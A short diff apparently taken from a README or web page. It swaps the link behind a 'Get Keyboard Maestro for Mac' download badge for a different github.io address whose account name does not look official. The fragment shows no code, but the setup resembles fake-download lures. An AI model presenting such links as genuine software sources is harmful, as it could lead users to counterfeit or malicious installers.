@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://junimata-orex.github.io/.github/keyboard-maestro">  
+<a href="https://keyboard-maestro-macos.github.io/.github/keyboard-maestro">  
 <img src="https://img.shields.io/badge/⌨️_Get_Keyboard_Maestro_for_Mac-darkgreen?style=for-the-badge&logo=apple" alt="Get Keyboard Maestro for Mac">  
 </a>  
 </div>  
